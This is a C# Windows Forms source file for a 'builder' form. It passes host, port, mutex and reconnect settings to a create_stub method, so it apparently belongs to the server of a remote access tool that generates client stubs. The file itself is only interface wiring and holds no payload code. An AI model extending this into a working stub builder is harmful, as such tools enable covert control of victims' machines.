using Serveur.Controllers;
using System;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmBuilder : Form
    {
        private FrmBuilderController buildercontroller = new FrmBuilderController();

        public FrmBuilder()
        {
            InitializeComponent();
        }
        private void btn_gen_Click(object sender, EventArgs e)
        {
            buildercontroller.ReconnectTries = numReconnectTries.Text;
            buildercontroller.create_stub(txtHost.Text, numPort.Text, txtMutex.Text, numReconnectTries.Text);
            this.Hide();
        }

        private void btnMutex_Click(object sender, EventArgs e)
        {
            txtMutex.Text = buildercontroller.getUniqueMutex(18);
        }        

        private void numPort_ValueChanged(object sender, EventArgs e)
        {

        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            txtMutex.Text = buildercontroller.getUniqueMutex(18);
            txtClientTag.Text = "Client01";
        }
    }
}
